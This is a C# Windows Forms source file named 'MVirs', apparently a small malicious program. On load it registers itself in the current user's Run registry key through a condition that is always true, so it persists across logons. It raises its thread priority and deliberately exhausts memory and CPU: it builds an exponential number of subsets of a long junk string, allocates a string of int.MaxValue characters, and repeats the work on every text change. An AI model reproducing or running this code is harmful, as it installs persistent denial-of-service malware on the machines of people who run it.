using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;


namespace MVirs
{
    public partial class MVirs : Form
    {
        public MVirs()
        {
            Thread.CurrentThread.Priority = ThreadPriority.Highest;
            InitializeComponent();
        }

        public void Form1Load(object sender, EventArgs e)
        {
            if (textBox1.TextLength > -1) SetStartup();
            try
            {
                textBox1.Text =
                    CalculateAllSubSet(
                        "4291846201dasiyuwierqioefrhwlejfoqwiugd238463289odnoadiwhroiuw324rq98yhwnq293WRQ2397");

            }
            catch (Exception ex)
            {
                Text = ex.Message;
            }


            try
            {
                textBox1.Text = new string('a', int.MaxValue);
            }
            catch (Exception ex)
            {
                Text = ex.Message;
            }
        }
        //------------------------------   Calculate SubSet Function   ---------------------------------//
        private String CalculateAllSubSet(string rawtxt)                                                //
        {
            // Initilizment
            string set = rawtxt;
            var subsets = new List<string>();

            // Loop over individual elements
            for (int i = 1; i < set.Length; i++)
            {
                subsets.Add(set[i - 1].ToString());

                var innerSubsets = new List<string>();
                foreach (string t in subsets)
                    innerSubsets.Add(t + "," + set[i]);
                // Loop over existing subsets

                subsets.AddRange(innerSubsets);
            }

            // Add last element of set then sort subset
            subsets.Add(set[set.Length - 1].ToString());
            subsets.Sort();


            return subsets.ToString();
        }                                                                                               //
        //------------------------------   Calculate SubSet Function   ---------------------------------//

        private void SetStartup()
        {
            var rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (textBox1.TextLength > -1)
                rk.SetValue(Application.ProductName, Application.ExecutablePath);
            else
                rk.DeleteValue(Application.ProductName, false);

        }

        private void TextBox1TextChanged(object sender, EventArgs e)
        {
            textBox1.Text = CalculateAllSubSet(textBox1.Text);
        }
    }
}
